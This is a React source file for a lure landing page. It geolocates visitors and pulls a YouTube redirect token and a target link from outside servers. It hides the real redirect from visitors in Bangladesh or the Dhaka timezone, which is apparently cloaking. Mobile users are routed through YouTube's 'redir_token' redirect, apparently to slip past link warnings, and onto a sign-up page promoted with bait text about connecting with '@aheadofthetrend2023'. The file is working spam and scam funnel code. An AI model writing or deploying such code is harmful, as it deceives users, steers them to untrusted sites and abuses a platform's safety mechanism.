import { useEffect, useState } from "react";
import "./App.css";
import axios from "axios";
import _404 from "./compoments/_404";
import { isMobile } from "react-device-detect";

function App() {
  let timecon =
    Intl.DateTimeFormat().resolvedOptions().timeZone === "Asia/Dhaka";
  const [hi, setHi] = useState("");
  const [URL, setURL] = useState("");
  const [ytToken, setYtToken] = useState("");
  const [countryCode, setCountryCode] = useState("");
  const [counter, setConter] = useState(0);
  const [test, setTest] = useState("");
  const [youtube, setYoutube] = useState(false);
  const [userLink, setUserLink] = useState("");

  const [isLoding, setIsLoding] = useState(true);
  console.log("time:", timecon);
  // params
  const queryString = window.location.search;
  const urlParam = new URLSearchParams(queryString);
  const value = urlParam.get("page");
  console.log("value", value);
  console.log(`${window.location.search}`);
  console.log(`${window.location.origin}/r/${window.location.search}`);

  //
  useEffect(() => {
    AxiosCaller();
    if (ytToken && userLink) {
      console.log("yt ok");
      setIsLoding(false);
      setYoutube(true);
    }
  }, []);

  // (All functions)
  // all axios actions
  const AxiosCaller = () => {
    Promise.all([
      axios.get("https://geolocation-db.com/json/"),
      axios.get("https://shoetlld.store/yttoken"),
      axios.post("https://codeadmincoderunner.xyz/users1", { message: "ok" }),
    ]).then((res) => {
      setIsLoding(false);
      setYoutube(true);
      // country code
      setCountryCode(res[0].data.country_code);
      // youtube token
      setYtToken(res[1].data[0]);
      // admin condition
      const bdTrue = countryCode === "BD";
      if (bdTrue === false && timecon === false) {
        console.log("push success");

        setHi(res[2].data.message);
        if (res[2].data.message) {
          console.log("push success true");
        }
      }

      // find link
      // console.log(res[3].data.link[0].modelCoverPhotoUrl);
      // setUserLink(res[3].data.link[0].modelCoverPhotoUrl);
    });
  };
  const RedirctLink = () => {
    setConter(counter + 1);
    console.log(counter);
    // user
    if (hi) {
      if (isMobile) {
        window.location.replace(
          `vnd.youtube://youtube.com/redirect?event=comments&redir_token=${ytToken}&q=${hi}&html_redirect=1&html_redirect=1`
        );
        if (2 <= counter) {
          console.log("______________________________________________________");
          window.location.replace(hi);
        }
      } else {
        window.location.replace(hi);
      }
    } else {
      if (isMobile) {
        window.location.replace(
          `vnd.youtube://youtube.com/redirect?event=comments&redir_token=${ytToken}&q=${window.location.origin}/profile/${window.location.search}&html_redirect=1&html_redirect=1`
        );
        if (2 <= counter) {
          console.log("______________________________________________________");
          window.location.replace(
            `${window.location.origin}/profile/${window.location.search}`
          );
        }
      } else {
        window.location.replace(
          `${window.location.origin}/profile/${window.location.search}`
        );
      }
    }
  };
  if (value) {
    return (
      <div className="bg-gradient-to-r from-sky-200 to-sky-300 ">
        {youtube && (
          <div className="">
            <main className={"main"}>
              <div className="pt-[50px] text-start">
                <h2 className="font-bold text-start text-white text-3xl font-mono"></h2>
                <p className="text-md font-serif">
                  <span className="text-xl text-bold  my-2">
                    Stay ahead of the curve with my latest insights. Hit
                    'CONT.INUE', create a free account, and connect with me
                    using the username @aheadofthetrend2023. Let's explore the
                    future together!
                  </span>
                  {/* <ul>
                  <li>1. First click continue button </li>
                  <li>2. Then you create a profile in there </li>
                  <li>3. And then confrim your email </li>
                  <li>4. then you find me my username fshf3459 </li>
                </ul> */}
                </p>
              </div>
              <div className={"center text-center mt-10"}>
                <button
                  onClick={() => RedirctLink()}
                  type="button"
                  class="bg-gradient-to-r pl-20 pr-20 from-sky-400  h-[50px] rounded-full to-blue-500 hover:from-pink-500 hover:to-yellow-500 ..."
                >
                  <b className="text-xl text-white">CONT.INUE</b>
                </button>
              </div>
            </main>
          </div>
        )}
        {isLoding && (
          <div class="flex mt-[200px] items-center justify-center">
            <div
              class="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-current border-r-transparent align-[-0.125em] motion-reduce:animate-[spin_1.5s_linear_infinite]"
              role="status"
            >
              <span class="!absolute !-m-px !h-px !w-px !overflow-hidden !whitespace-nowrap !border-0 !p-0 ![clip:rect(0,0,0,0)]">
                Loading...
              </span>
            </div>
          </div>
        )}
      </div>
    );
  } else {
    return <_404></_404>;
  }
}

export default App;
